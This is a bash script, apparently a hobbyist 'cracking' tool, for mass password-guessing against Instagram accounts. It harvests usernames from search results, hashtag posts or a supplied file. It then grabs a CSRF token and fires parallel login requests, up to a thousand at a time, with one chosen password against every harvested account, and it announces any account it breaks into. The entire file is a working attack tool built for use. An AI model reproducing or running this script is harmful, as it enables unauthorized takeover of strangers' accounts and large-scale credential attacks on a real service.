#!/bin/bash
#author         : ./Shihab
#recode         : ./internet-help-zone-shihab
#fb             :www.facebook.com/shihabuddin.shihab.1865

clear
#color(bold)
red='\e[1;31m'
green='\e[1;32m'
yellow='\e[1;33m'
blue='\e[1;34m'
magenta='\e[1;35m'
cyan='\e[1;36m'
white='\e[1;37m'

#thread limit => kurangin lebih kecil angkanya boleh, naikin? saran w jangan... awokwowok:v
limit=1000

#banner
	echo -e $'''
'\e[1;32m'██████╗░  '\e[1;32m'░██████╗  '\e[1;35m'░██╗░░░░░░░██╗
'\e[1;35m'██╔══██╗  '\e[1;36m'██╔════╝  '\e[1;34m'░██║░░██╗░░██║
'\e[1;34m'██████╦╝  '\e[1;31m'╚█████╗░  '\e[1;33m'░╚██╗████╗██╔╝
'\e[1;33m'██╔══██╗  '\e[1;37m'░╚═══██╗  '\e[1;34m'░░████╔═████║░
'\e[1;34m'██████╦╝  '\e[1;33m'██████╔╝  '\e[1;32m'░░╚██╔╝░╚██╔╝░
'\e[1;32m'╚═════╝░  '\e[1;35m'╚═════╝░  '\e[1;35m'░░░╚═╝░░░╚═╝░░

#banner
  echo -e $'''
'\e[1;32m'▀█▀ ▒█▄░▒█ ▒█▀▀▀█ ▀▀█▀▀ ▒█▀▀█ ░█▀▀█ ▒█▀▀█ ▒█░▄▀ 　 '\e[1;34m'▒█░▒█ ░█▀▀█ ▒█▀▀█ ▒█░▄▀ 
'\e[1;32m'▒█░ ▒█▒█▒█ ░▀▀▀▄▄ ░▒█░░ ▒█▄▄▀ ▒█▄▄█ ▒█░░░ ▒█▀▄░ 　 '\e[1;33m'▒█▀▀█ ▒█▄▄█ ▒█░░░ ▒█▀▄░ 
'\e[1;32m'▄█▄ ▒█░░▀█ ▒█▄▄▄█ ░▒█░░ ▒█░▒█ ▒█░▒█ ▒█▄▄█ ▒█░▒█ 　 '\e[1;36m'▒█░▒█ ▒█░▒█ ▒█▄▄█ ▒█░▒█

\e[1;31m ▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅๑۩🅑🅢🅦۩๑▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅
\e[1;32m ➣CREATOR👉     '\e[1;33m' MOHAMMAD SHIHAB UDDIN
\e[1;33m ➣YOUTUBE👉     '\e[1;36m' INTERNET HELP ZONE
\e[1;34m ➣THANKS FOR👉  '\e[1;32m' FARHAN AHAMRD
\e[1;35m ➣GITHUB👉      '\e[1;32m' https://github.com/internet-help-zone-shihab
\e[1;36m ▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅

\e[1;31m               *Press 'CTRL + Z' to exit*
'''
#dependencies
dependencies=( "jq" "curl" )
for i in "${dependencies[@]}"
do
    command -v $i >/dev/null 2>&1 || {
        echo >&2 "$i : not installed - install by typing the command : apt install $i -y"
        exit
    }
done

#menu
echo -e '''
\e[1;31m[1] \e[1;36mGet target from \e[1;35m@Username\e[1;37m
\e[1;36m[2] \e[1;31mGet target from \e[1;32m#Hashtag\e[1;37m
\e[1;35m[3] \e[1;33mCrack from File
'''

read -p $'\e[1;32m[✺]\e[36m Choose an Option  ➣ \e[1;33m' opt


touch target

case $opt in
    1) #menu 1
        read -p $'\e[1;34m[✺]\e[35m Enter @Username   ➣ \e[1;33m' ask
        collect=$(curl -s "https://www.instagram.com/web/search/topsearch/?context=blended&query=${ask}" | jq -r '.users[].user.username' > target)
        echo $'\e[1;32m[✺]\e[1;32m Just found        ➣ \e[1;32m'$collect''$(< target wc -l ; echo -e "${green}Users")
        read -p $'\e[1;35m[✺]\e[1;35m Password to use   ➣ \e[1;33m' pass
        echo -e "\e[1;36m[✺]\e[1;36m Start cracking...${yellow}"
        ;;
    2) #menu 2
        read -p $'\e[36m[\e[36m✺\e[36m] Tags for use      ➣ \e[1;33m' hashtag
        get=$(curl -sX GET "https://www.instagram.com/explore/tags/${hashtag}/?__a=1")
        if [[ $get =~ "Page Not Found" ]]; then
        echo -e "$hashtag : ${red}Hashtag not found${white}"
        exit
        else
            echo "$get" | jq -r '.[].hashtag.edge_hashtag_to_media.edges[].node.shortcode' | awk '{print "https://www.instagram.com/p/"$0"/"}' > result
            echo -e "\e[1;31m[✺]\e[1;31m Removing duplicate user from tag ${blue}#$hashtag${white}"$(sort -u result > hashtag)
            echo -e "\e[1;32m[✺]\e[1;32m Just found        ➣ ${green}"$(< hashtag wc -l ; echo -e "${green}user")
            read -p $'\e[1;34m[✺]\e[1;34m Password to use   ➣ \e[1;33m' pass
            echo -e "\e[1;32m[✺]\e[1;32mStart cracking...${white}"
            for tag in $(cat hashtag); do
                echo $tag | xargs -P 100 curl -s | grep -o "alternateName.*" | cut -d "@" -f2 | cut -d '"' -f1 >> target &
            done
            wait
            rm hashtag result
        fi
        ;;
    3) #menu 3
        read -p $'\e[1;35m[✺]\e[1;35m Input your list   ➣ \e[1;33m' list
        if [[ ! -e $list ]]; then
            echo -e "${red}file not found${white}"
            exit
            else
                cat $list > target
                echo -e "\e[1;34m[✺]\e[1;34m Total User found  ➣ ${blue}"$(< target wc -l)
                read -p $'\e[1;35m[✺]\e[1;35m Password to use   ➣ \e[1;33m' pass
                echo -e "${red}[${red}✺${red}] ${red}Start cracking...${white}"
        fi
        ;;
    *) #wrong menu
        echo -e "${white}options are not on the menu"
        sleep 1
        clear
        bash brute.sh
esac

#start_brute
token=$(curl -sLi "https://www.instagram.com/accounts/login/ajax/" | grep -o "csrftoken=.*" | cut -d "=" -f2 | cut -d ";" -f1)
function brute(){
    url=$(curl -s -c cookie.txt -X POST "https://www.instagram.com/accounts/login/ajax/" \
                    -H "cookie: csrftoken=${token}" \
                    -H "origin: https://www.instagram.com" \
                    -H "referer: https://www.instagram.com/accounts/login/" \
                    -H "user-agent: Mozilla/5.0 (Linux; Android 6.0.1; SAMSUNG SM-G930T1 Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/4.0 Chrome/44.0.2403.133 Mobile Safari/537.36" \
                    -H "x-csrftoken: ${token}" \
                    -H "x-requested-with: XMLHttpRequest" \
                    -d "username=${i}&password=${pass}")
                    login=$(echo $url | grep -o "authenticated.*" | cut -d ":" -f2 | cut -d "," -f1)
                    if [[ $login =~ "true" ]]; then
                            echo -e "[${green}✓${white}] ${yellow}You get it! ${blue}[${white}@$i - $pass${blue}] ${white}- with: "$(curl -s "https://www.instagram.com/$i/" | grep "<meta content=" | cut -d '"' -f2 | cut -d "," -f1)
                        elif [[ $login =~ "false" ]]; then
                                    echo -e "[${red}✘${white}] @$i - ${red}failed to crack${white}"
                            elif [[ $url =~ "checkpoint_required" ]]; then
                                    echo -e "[${cyan}✚${white}] @$i ${white}: ${green}checkpoint${white}"
                    fi
}

#thread
(
    for i in $(cat target); do
        ((thread=thread%limit)); ((thread++==0)) && wait
        brute "$i" &
    done
    wait
)

rm target
